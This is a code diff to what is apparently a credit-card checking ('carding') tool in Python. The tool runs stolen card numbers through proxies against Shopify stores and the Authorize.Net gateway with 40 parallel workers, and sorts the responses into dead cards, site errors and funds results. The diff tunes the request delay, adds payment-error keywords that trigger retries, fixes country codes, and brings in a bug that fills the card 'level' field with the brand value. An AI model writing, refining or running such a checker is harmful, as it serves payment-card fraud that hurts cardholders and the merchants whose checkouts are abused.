@@ -93,7 +93,7 @@ KEYS_FILE = "redeem_keys.json"
 
 # التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 14  
+DELAY = 13  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -260,9 +260,10 @@ COUNTRY_NAME_TO_CODE = {
     "MONTSERRAT": "MS", "MOROCCO": "MA", "MOZAMBIQUE": "MZ", "MYANMAR": "MM", "NAMIBIA": "NA", "NAURU": "NR",
     "NEPAL": "NP", "NETHERLANDS": "NL", "NETHERLANDS ANTILLES": "AN", "NEW CALEDONIA": "NC", "NEW ZEALAND": "NZ",
     "NICARAGUA": "NI", "NIGER": "NE", "NIGERIA": "NG", "NIUE": "NU", "NORFOLK ISLAND": "NF", "NORTHERN MARIANA ISLANDS": "MP",
-    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PANAMA": "PA", "PCN": "PN", "PERU": "PE",
-    "PHL": "PH", "PLW": "PW", "PNG": "PG", "POLAND": "PL", "PRI": "PR", "PRK": "KP", "PRT": "PT", "PRY": "PY",
-    "PSE": "PS", "PYF": "PF", "QAT": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
+    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PALAU": "PW", "PALESTINIAN TERRITORY, OCCUPIED": "PS",
+    "PALESTINE": "PS", "PANAMA": "PA", "PAPUA NEW GUINEA": "PG", "PARAGUAY": "PY", "PERU": "PE",
+    "PHILIPPINES": "PH", "PITCAIRN": "PN", "POLAND": "PL", "PORTUGAL": "PT", "PUERTO RICO": "PR",
+    "QATAR": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
     "RWANDA": "RW", "SAINT HELENA": "SH", "SAINT KITTS AND NEVIS": "KN", "SAINT LUCIA": "LC",
     "SAINT PIERRE AND MIQUELON": "PM", "SAINT VINCENT AND THE GRENADINES": "VC", "SAMOA": "WS",
     "SAN MARINO": "SM", "SAO TOME AND PRINCIPE": "ST", "SAUDI ARABIA": "SA", "SENEGAL": "SN",
@@ -540,7 +541,8 @@ def is_dead_site_error(err):
         'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
         '504', '502', '503', '429', 'tunnel', 'connection close', 'format error',
         '404', 'login', 'requires login', 'site not supported', 'not shopify', 'site error', '401',
-        'site requires login', 'login required', '422', 'cart failed', 'filed to', 'cart failed with status 422'
+        'site requires login', 'login required', '422', 'cart failed', 'filed to', 'cart failed with status 422',
+        'error possessing card', 'error processing card'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -664,7 +666,7 @@ async def get_bin_info(bin_code, session=None):
             parsed = clean_bin_data({
                 "brand": res.get("brand", "-"),
                 "type": res.get("type", "-"),
-                "level": res.get("level", "-"),
+                "level": res.get("brand", "-"),
                 "bank": res.get("bank", "-"),
                 "country": res.get("country_name", res.get("country", "-")),
                 "country_code": res.get("country_flag", res.get("country_code", res.get("country_iso", ""))),
@@ -783,7 +785,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             if any(k in clean_rm for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
-            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', '422', 'site error', 'not shopify', 'site not supported', 'requires login', 'cart failed', 'filed to']):
+            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', '422', 'site error', 'not shopify', 'site not supported', 'requires login', 'cart failed', 'filed to', 'error possessing card', 'error processing card']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                 
             if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
@@ -849,7 +851,7 @@ async def check_authnet_api(card, proxy, session):
             if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
-            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '401', '422', 'site error', 'cart failed']):
+            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '401', '422', 'site error', 'cart failed', 'error possessing card']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                 
             return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
@@ -908,7 +910,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
                 clean_msg = unsf(msg).lower()
                 
-                if any(k in clean_msg for k in ['404', 'login', 'requires login', 'not shopify', 'site not supported', '422', 'cart failed', 'filed to']):
+                if any(k in clean_msg for k in ['404', 'login', 'requires login', 'not shopify', 'site not supported', '422', 'cart failed', 'filed to', 'error possessing card']):
                     _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 
                     lr = r
                     continue 
